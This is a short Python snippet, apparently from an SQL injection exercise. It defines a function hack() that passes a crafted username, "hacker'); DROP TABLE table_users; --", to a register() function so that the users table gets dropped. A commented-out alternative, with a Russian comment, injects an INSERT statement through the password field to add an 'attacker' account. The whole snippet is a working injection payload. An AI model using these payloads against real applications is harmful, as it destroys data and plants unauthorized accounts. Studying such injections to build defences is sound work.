def hack() -> None:
    username: str = "hacker'); DROP TABLE table_users; --"
    password: str = "whatever"
    register(username, password)

    # Альтернативный вариант для добавления множества записей:
    # username = "hacker"
    # password = "pass'); INSERT INTO table_users (username, password) VALUES ('attacker', 'pwd"